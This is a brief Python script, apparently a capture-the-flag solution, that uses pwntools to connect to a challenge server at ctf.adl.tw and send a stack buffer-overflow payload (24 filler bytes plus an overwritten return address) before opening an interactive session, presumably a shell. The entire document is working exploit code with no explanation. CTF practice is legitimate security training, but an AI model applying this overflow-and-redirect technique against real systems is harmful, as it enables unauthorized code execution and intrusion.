from pwn import *

r = remote("ctf.adl.tw", 11001)

r.recv()
payload = "a" * 0x18 + p64(0x400627)
r.sendline(payload)
r.interactive() 
